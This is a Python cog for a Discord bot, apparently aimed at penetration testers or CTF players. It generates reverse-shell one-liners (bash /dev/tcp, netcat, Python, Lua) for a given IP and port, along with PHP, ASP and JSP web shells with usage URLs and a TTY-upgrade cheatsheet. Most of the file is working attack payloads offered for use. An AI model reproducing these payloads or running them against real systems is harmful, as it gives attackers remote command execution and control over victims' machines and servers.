from discord.ext import commands
import discord
import logging
import ipaddress

logger = logging.getLogger("RS-Commands")
RS_TYPES = ["bash-i", "bash196", "readline", "mkfifo", "py1", "py2", "nc-e", "nc-c", "lua"]
WEBSH_TYPES = ["php0", "php-cmd", "php-obf", "asp", "jsp"]

class ReverseShellCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(group="RevShell")
    async def revsh(self, ctx, type: str, ip: str, port: int):
        """Generate a payload for a reverse shell depending on the type of shell asked, using the specified IP and port.
        
        Args:
            type (str): Type of reverse shell to generate. Possible values: `bash-i`, `bash196`, `readline`, `mkfifo`, `py1`, `py2`, `nc-e`, `nc-c`, `lua`.
            ip (str): IP address of the target machine.
            port (int): Port number of the target machine.
        """
        logger.info(f" Received request for reverse shell: {type}, {ip}, {port} \nUser: {ctx.author.name}\nServer: {ctx.guild.name}\nChannel: {ctx.channel.name}\n")
        await ctx.message.add_reaction("💀")

        # Pre-Conditions
        if port < 1 or port > 65535:
            logger.error(f" Invalid port number for reverse shell: {port}\n")
            return await ctx.send("Invalid port number. (Range 1-65535)")

        if not ipaddress.IPv4Address(ip):
            logger.error(f" Invalid IP address: {ip}\n")
            return await ctx.send("Invalid IP address format.")

        if type.lower() not in RS_TYPES:
                logger.error(f" Invalid type: {type}\n")
                return await ctx.send("Invalid type. See the help message for the list of valid types.")


        match type.lower():
            case "bash-i":
                payload = f"```bash\nbash -i >& /dev/tcp/{ip}/{port} 0>&1```"

            case "bash196":
                payload = f"```bash\n0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196```"

            case "readline":
                payload = f"```bash\nexec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done```"

            case "mkfifo":
                payload = f"```bash\nmkfifo pipe;cat pipe | /bin/sh -i 2>&1 | nc {ip} {port} >/dev/null; rm pipe```"

            case "py1":
                payload = f"```python\npython -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'```"
                    
            case "py2":
                payload = f"```python\nexport RHOST={ip};export RPORT={port};python -c 'import socket,sys,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'```"

            case "nc-e":
                payload = f"```bash\nnc -e /bin/bash {ip} {port}```"

            case "nc-c":
                payload = f"```bash\nnc -c 'exec /bin/bash' {ip} {port}```"

            case "lua":
                payload = f"```lua\nlua -e \"require(\"socket\");require(\"os\");t=socket.tcp();t:connect(\"{ip}\",{port});os.execute(\"/bin/bash -i <&3 >&3 2>&3);\"```"


        embed = discord.Embed(
            title = f"Reverse Shell Generator 💀",
            description = f"""◈ **Type**: {type}\n\n◈ **IP**: {ip}\n\n◈ **Port**: {port}\n\n {payload} \n❗ These shell payloads are for **Linux** only. If they are not working, try **UDP** instead of **TCP**. If you are using _code langs_ options, try to use different binary versions if doesn't work.""",
            colour = discord.Colour.dark_red()
        )
        embed.set_footer(text="Shhhh, I'm a secret agent! 🕵️‍♂️")
        embed.set_thumbnail(url="https://play.pokemonshowdown.com/sprites/trainers/blaine.png")
        embed.set_author(name="Mr. Revshells", icon_url="https://play.pokemonshowdown.com/sprites/trainers/blaine.png")

        logger.info(f" Sent {type} reverse shell to {ctx.author.name}\n")
        await ctx.send(embed=embed)

    @commands.command(group="RevShell")
    async def websh(self, ctx, type: str):
        """Generate a payload for a web shell depending on the type of shell asked.
        
        Args:
            type (str): Type of web shell to generate. Possible values: `php0`, `php-cmd`, `php-obf`, `asp`, `jsp`.
        """
        logger.info(f" Received request for web shell: {type} \nUser: {ctx.author.name}\nServer: {ctx.guild.name}\nChannel: {ctx.channel.name}\n")
        await ctx.message.add_reaction("💀")
        
        
        # Pre-Conditions
        if type.lower() not in WEBSH_TYPES:
            logger.error(f" Invalid type: {type}\n")
            return await ctx.send("Invalid type. See the help message for the list of valid types.")


        match type.lower():
            case "php0":
                payload = f"```php\n<?php system($_GET['cmd']); ?>```"
                usage = "```http://target.com/shell.php?cmd=command```"

            case "php-cmd":
                payload = f"```php\n<?=`$_GET[0]`?>```"
                usage = "```http://target.com/shell.php?0=command```"

            case "php-obf":
                payload = f"```php\n<?=$_="";$_=\"'\" ;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord(\'_\')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}[\'_\'^\'o\'];echo`$_`?>```"
                usage = "```http://target.com/shell.php?_cmd=command```"

            case "asp":
                payload = "```asp\n<%Set c=CreateObject(\"WScript.Shell\"):Set r=c.Exec(Request(\"cmd\")):Response.Write(\"<pre>\"&r.StdOut.ReadAll()&\"</pre>\")%>```"
                usage = "```http://target.com/shell.asp?cmd=command```"

            case "jsp":
                payload = "```js\n<%@page import=\"java.io.*\"%><%Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\"));BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=r.readLine())!=null){out.println(l+\"<br>\");}%>```"
                usage = "```http://target.com/shell.jsp?cmd=whoami```"

        embed = discord.Embed(
            title = "Web Shell Generator 💀",
            description = f"""◈ **Type**: {type}\n\n◈ **Usage**: {usage} \n◈ **Payload**: \n{payload}""",
            colour = discord.Colour.dark_red()
            )
        embed.set_footer(text="Shhhh, I'm a secret agent! 🕵️‍♂️")
        embed.set_thumbnail(url="https://play.pokemonshowdown.com/sprites/trainers/blaine.png")
        embed.set_author(name="Mr. Revshells", icon_url="https://play.pokemonshowdown.com/sprites/trainers/blaine.png")

        logger.info(f" Sent {type} web shell to {ctx.author.name}\n")
        await ctx.send(embed=embed)


    @commands.command(group="RevShell")
    async def tty(self, ctx):
        """Give a cheatsheet to establish a full interactive TTY session after achieving a reverse shell."""
        logger.info(f" TTY requested\nUser: {ctx.author.name}\nServer: {ctx.guild.name}\nChannel: {ctx.channel.name}\n")
        await ctx.message.add_reaction("💀")


        embed = discord.Embed(
                title="TTY Cheatsheet 🖥️",
                description="Follow the steps below to establish a fully interactive **TTY** on the target machine:",
                colour=discord.Colour.dark_gold()
        )
        embed.add_field(name="1. Obtain a TTY Shell.", value="\n◈ With **Python**: ```python\npython -c \'import pty; pty.spawn(\"/bin/bash\")\'```\n◈ With **echo**: ```bash\necho os.system(\'/bin/bash\')```\n◈ With **Perl**: ```perl\nperl -e \'exec \"/bin/bash\";\'```\n◈ With **script**: ```bash\nscript -qc /bin/bash /dev/null```", inline=False)

        embed.add_field(name="2. Specify TERM and SHELL env. vars", value="The most used for **TERM** are **xterm**, **xterm-256color** and **screen**.\n```bash\nexport TERM=xterm```\nYou can use either **bash**, **sh**, **zsh**... for **SHELL** (Advisable to use path to the binary).\n```bash\nexport SHELL=bash```", inline=True)

        embed.add_field(name="3. Send Reverse Shell to background and change terminal I/O settings", value="◈ In **Reverse Shell**, use _CTRL+Z_ to send it to background processes.\n\n◈ In your **CLI**, use this: ```bash\nstty raw -echo; fg```\nThen, use `reset` in the **Reverse Shell**", inline=True)
        
        embed.add_field(name="4. Adjust rows and columns of the Reverse Shell to match your terminal's dimensions ", value="◈ In your **CLI**: ```bash\nstty size```\n◈ In **Reverse Shell**: ```bash\nstty rows <num> columns <num>```", inline=True)
        embed.set_footer(text="Shhhh, I'm a secret agent! 🕵️‍♂️")
        embed.set_thumbnail(url="https://play.pokemonshowdown.com/sprites/trainers/blaine-lgpe.png")
        embed.set_author(name="Mr. Revshells", icon_url="https://play.pokemonshowdown.com/sprites/trainers/blaine.png")

        logger.info(f" Sent TTY cheatsheet to {ctx.author.name}\n")
        await ctx.send(embed=embed)





async def setup(bot):
    await bot.add_cog(ReverseShellCog(bot))